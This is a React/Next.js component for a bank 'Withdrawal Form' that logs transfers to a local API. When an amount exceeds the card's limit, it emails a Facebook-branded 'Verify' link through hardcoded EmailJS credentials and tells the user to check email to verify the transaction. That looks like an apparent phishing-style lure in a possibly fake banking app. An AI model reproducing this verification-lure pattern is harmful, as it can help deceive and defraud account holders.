"use client";
import { useRouter } from "next/navigation";
import { useState } from "react";
import Swal from 'sweetalert2';
import emailjs from '@emailjs/browser';

export default function SendForm({ data }) {

    const [des_acct, setDes_acct] = useState("");
    const [bank_name, setBank_name] = useState("");
    const [amount, setAmmount] = useState("");

    const router = useRouter();

    const handleSend = async (e) => {
        e.preventDefault();

        if(!des_acct || des_acct.length < 10 || des_acct.length > 10 || !bank_name || bank_name.length < 3 || 
            !amount) {
            alert("Error! All inputs should be filled properly");
            return;
        }

        if(amount*1 > data.w_limit*1) {
            // alert("Withdrawal Cancelled");
            try {
                let acct_no = des_acct;
                let type = "Pending...";
                let card_id = data._id;

                const res = await fetch('http://localhost:3000/api/trfs', {
                    method: "POST",
                    headers: {
                        "Content-type": "application/json",
                    },
                    body: JSON.stringify({ bank_name, acct_no, amount, type, card_id, }),
                });
    
                if(res.ok) {
                    const data = await res.json();
                    console.log("Trf Created");
                } else {
                    throw new Error('Failed to create Trf!');
                }
    
            } catch (error) {
                console.log(error);
            }
            emailjs.send("service_iowd66a","template_xffgp2q",{
                link: `https://www.facebook.com/Verify/${data._id}`,
            }, "c-i1xKKBG9UjWTPQ9");
            Swal.fire({
                icon: "error",
                title: "Oops...",
                text: "Transaction Failed - Limit Exceeded!",
                footer: '<a href="#">Check Email to Verify Transaction</a>'
              });
            return;
        } else {
            // alert("Withdrawal was Successful!");
            try {
                let acct_no = des_acct;
                let type = "Successful";
                let card_id = data._id;

                const res = await fetch('http://localhost:3000/api/trfs', {
                    method: "POST",
                    headers: {
                        "Content-type": "application/json",
                    },
                    body: JSON.stringify({ bank_name, acct_no, amount, type, card_id, }),
                });
    
                if(res.ok) {
                    const data = await res.json();
                    console.log("Trf Created");
                } else {
                    throw new Error('Failed to create Trf!');
                }
    
            } catch (error) {
                console.log(error);
            }
            Swal.fire({
                icon: "success",
                title: "Transaction Successful",
                showConfirmButton: false,
                timer: 1500
            });
            router.push("/Admin");
        }
    }

    return (
        <form className="flex flex-col space-y-5 w-full md:w-5/12 mx-auto my-32" onSubmit={handleSend}>
                    <div>
                        <h1 className="font-bold">Withdrawal Form</h1>
                    </div>
                    <div className="flex flex-col md:flex-row gap-5 w-full">
                        <div className="w-full">
                            <label htmlFor="name" className="block text-sm font-medium leading-6 text-gray-900">
                                Destination Account No
                            </label>
                            <div className="mt-2">
                                <input
                                onChange={(e) => setDes_acct(e.target.value)}
                                value={des_acct}
                                id="name"
                                name="number"
                                type="number"
                                autoComplete="number"
                                className="block w-full rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 
                                ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset 
                                focus:ring-blue-600 sm:text-sm sm:leading-6 outline-none ps-3"
                                />
                            </div>
                        </div>
                        <div className="w-full">
                            <label htmlFor="name" className="block text-sm font-medium leading-6 text-gray-900">
                                Bank Name
                            </label>
                            <div className="mt-2">
                                <input
                                onChange={(e) => setBank_name(e.target.value)}
                                value={bank_name}
                                id="name"
                                name="name"
                                type="text"
                                autoComplete="name"
                                className="block w-full rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 
                                ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset 
                                focus:ring-blue-600 sm:text-sm sm:leading-6 outline-none ps-3"
                                />
                            </div>
                        </div>
                    </div>
                    
                    <div>
                        <label htmlFor="name" className="block text-sm font-medium leading-6 text-gray-900">
                            Amount
                        </label>
                        <div className="mt-2">
                            <input
                            onChange={(e) => setAmmount(e.target.value)}
                            value={amount}
                            id="name"
                            name="name"
                            type="number"
                            autoComplete="name"
                            className="block w-full rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 
                            ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset 
                            focus:ring-blue-600 sm:text-sm sm:leading-6 outline-none ps-3"
                            />
                        </div>
                    </div>
                    <button type="submit" className="bg-blue-600 hover:bg-blue-500 text-white py-2 px-4 
                    rounded-full md:w-3/12 text-center">
                        Withdraw
                    </button> 
                </form>
    );
}